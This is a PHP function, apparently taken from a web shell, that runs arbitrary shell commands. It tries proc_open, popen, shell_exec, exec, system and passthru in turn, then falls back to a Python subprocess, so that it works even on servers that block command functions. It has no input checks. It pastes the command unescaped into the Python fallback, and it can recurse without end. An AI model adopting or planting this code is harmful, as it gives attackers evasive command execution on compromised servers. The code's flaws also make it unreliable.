function execute_command($cmd) {
    $output = '';
    
    // Method 1: proc_open
    if (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
            if ($output) return $output;
        }
    }
    
    // Method 2: popen
    if (function_exists('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            if ($output) return $output;
        }
    }
    
    // Method 3: shell_exec + alternatives
    $funcs = array('shell_exec', 'exec', 'system', 'passthru');
    foreach ($funcs as $func) {
        if (function_exists($func)) {
            ob_start();
            $func($cmd);
            $temp = ob_get_clean();
            if ($temp) return $temp;
        }
    }
    
    // Method 4: Python fallback (kalau python ada)
    if (file_exists('/usr/bin/python3') || file_exists('/usr/bin/python')) {
        $py = "python3 -c \"import subprocess; print(subprocess.getoutput('$cmd'))\" 2>&1";
        return execute_command($py);
    }
    
    return "Command execution failed. All methods blocked.";
}
